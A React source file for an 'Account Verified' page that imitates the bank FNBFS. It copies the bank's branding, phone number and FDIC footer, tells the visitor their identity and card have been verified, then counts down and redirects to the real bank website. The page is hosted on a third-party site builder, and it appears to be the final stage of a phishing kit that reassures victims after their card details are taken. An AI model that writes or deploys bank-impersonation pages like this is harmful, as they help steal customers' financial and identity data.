import { useEffect, useState } from 'react';

const BG_IMAGE = 'https://storage.readdy-site.link/project_files/2c4f8ff7-4756-4178-b267-42959e65ba3d/70f06539-cc97-4527-a402-129ea4a73ba7_compressed_photo_2026-07-01_22-39-05.webp';

const REDIRECT_URL = 'https://www.fnbfs.com';

export default function AccountVerifiedPage() {
  const [countdown, setCountdown] = useState(5);

  const goToSite = () => {
    // Real external redirect — sends the browser out to the live site.
    window.location.assign(REDIRECT_URL);
  };

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          goToSite();
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  return (
    <main
      className="relative flex flex-col min-h-screen w-full overflow-hidden bg-foreground-950"
      aria-label="Account Verified"
    >
      {/* Background image with overlay */}
      <div className="absolute inset-0">
        <img
          src={BG_IMAGE}
          alt=""
          aria-hidden="true"
          className="h-full w-full object-cover object-top scale-105"
        />
        <div className="absolute inset-0 bg-foreground-950/30" />
      </div>

      {/* Content */}
      <div className="relative z-10 flex flex-1 items-center justify-center px-5 py-8">
        <div
          className="w-full max-w-sm rounded-xl bg-background-50 p-8 text-center animate-fade-in-up"
          style={{ animationDelay: '0.1s' }}
        >
          {/* Success icon */}
          <div className="mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-accent-100">
            <i className="ri-checkbox-circle-fill text-4xl text-accent-500" aria-hidden="true" />
          </div>

          <h1
            className="mb-2 text-lg text-foreground-950"
            style={{ fontFamily: 'Inter, system-ui, -apple-system, sans-serif' }}
          >
            Account Verified
          </h1>

          <p
            className="mb-5 text-sm leading-relaxed"
            style={{ color: '#6B7280', fontFamily: 'system-ui, -apple-system, sans-serif' }}
          >
            Your identity and card have been successfully verified.
            <br />
            Taking you to your account now.
          </p>

          {/* Redirect notice */}
          <div
            className="mb-6 flex items-center justify-center gap-2 text-sm text-foreground-600"
            style={{ fontFamily: 'system-ui, -apple-system, sans-serif' }}
          >
            <i className="ri-loader-4-line animate-spin text-base" aria-hidden="true" />
            <span>Redirecting in {countdown}s...</span>
          </div>

          {/* Continue button — real external redirect */}
          <button
            type="button"
            onClick={goToSite}
            className="flex items-center justify-center gap-2 whitespace-nowrap rounded-lg bg-primary-500 px-10 py-2.5 text-sm font-semibold text-background-50 transition-all duration-200 hover:bg-primary-600 active:bg-primary-700 w-full max-w-[220px] mx-auto cursor-pointer"
          >
            <i className="ri-arrow-right-line text-base" aria-hidden="true" />
            <span>Continue to Account</span>
          </button>
        </div>
      </div>

      {/* Footer bar */}
      <footer className="relative z-10 bg-background-50 py-4">
        <div className="flex flex-col items-center gap-1 text-center text-xs text-foreground-500">
          <p>&copy; 2026 FNBFS &bull; (479) 788-4600</p>
          <p>Privacy policy &bull; Member FDIC</p>
          <p>An Equal Housing Lender</p>
        </div>
      </footer>
    </main>
  );
}